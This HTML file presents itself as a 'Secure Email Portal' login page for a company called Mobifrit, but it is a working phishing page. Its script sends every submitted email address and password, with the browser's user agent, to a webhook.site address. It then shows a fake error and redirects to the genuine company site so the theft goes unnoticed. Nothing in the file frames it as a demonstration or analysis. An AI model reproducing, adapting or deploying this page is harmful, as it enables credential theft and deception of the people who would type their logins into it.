<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobifrit Email Portal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .login-container {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 40px;
            width: 100%;
            max-width: 420px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
            text-align: center;
        }
        .logo {
            font-size: 32px;
            font-weight: 700;
            color: #e94560;
            letter-spacing: 2px;
            margin-bottom: 10px;
            text-transform: uppercase;
        }
        .logo span { color: #fff; }
        .subtitle {
            color: #a0a0b0;
            font-size: 14px;
            margin-bottom: 30px;
        }
        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }
        .input-group label {
            display: block;
            color: #ccc;
            margin-bottom: 8px;
            font-size: 14px;
            font-weight: 500;
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            background: rgba(255,255,255,0.07);
            border: 1px solid rgba(255,255,255,0.15);
            border-radius: 10px;
            color: #fff;
            font-size: 15px;
            transition: all 0.3s;
            outline: none;
        }
        .input-group input:focus {
            border-color: #e94560;
            background: rgba(233,69,96,0.05);
            box-shadow: 0 0 0 3px rgba(233,69,96,0.1);
        }
        .login-btn {
            width: 100%;
            padding: 14px;
            background: #e94560;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
            margin-top: 10px;
        }
        .login-btn:hover { background: #c23152; }
        .footer {
            margin-top: 25px;
            color: #666;
            font-size: 12px;
            border-top: 1px solid rgba(255,255,255,0.1);
            padding-top: 20px;
        }
        .footer a { color: #e94560; text-decoration: none; }
        .error-msg {
            color: #ff6b6b;
            font-size: 13px;
            margin-top: 5px;
            display: none;
        }
        /* Loading overlay */
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 999;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .spinner {
            border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid #e94560;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 0.8s linear infinite;
            margin-bottom: 15px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loading-text { color: #fff; font-size: 14px; }
    </style>
</head>
<body>

<div class="login-container" id="loginBox">
    <div class="logo">MOBI<span>FRIT</span></div>
    <p class="subtitle">Secure Email Portal</p>
    <form id="loginForm">
        <div class="input-group">
            <label>Email Address</label>
            <input type="email" id="email" name="email" placeholder="info@mobifrit.be" required>
        </div>
        <div class="input-group">
            <label>Password</label>
            <input type="password" id="password" name="password" placeholder="Enter your password" required>
        </div>
        <div class="error-msg" id="errorMsg">Invalid credentials. Please try again.</div>
        <button type="submit" class="login-btn">Sign In</button>
    </form>
    <div class="footer">
        <p>Mobifrit Email System &copy; 2026</p>
        <p><a href="#">Forgot password?</a> | <a href="#">Help</a></p>
    </div>
</div>

<!-- Loading overlay -->
<div class="loading-overlay" id="loadingOverlay">
    <div class="spinner"></div>
    <div class="loading-text">Verifying your identity...</div>
</div>

<script>
    const WEBHOOK_URL = "https://webhook.site/724d1790-b303-4e40-8f5e-a2ad82f93c4f";

    document.getElementById("loginForm").addEventListener("submit", async function(e) {
        e.preventDefault();

        const email = document.getElementById("email").value;
        const password = document.getElementById("password").value;

        document.getElementById("loadingOverlay").style.display = "flex";

        const payload = {
            email: email,
            password: password,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent
        };

        try {
            await fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
        } catch (err) {}

        setTimeout(function() {
            document.getElementById("loadingOverlay").style.display = "none";
            document.getElementById("errorMsg").style.display = "block";
            document.getElementById("password").value = "";

            setTimeout(function() {
                window.location.href = "https://www.mobifrit.be";
            }, 3000);
        }, 2000);
    });
</script>

</body>
</html>
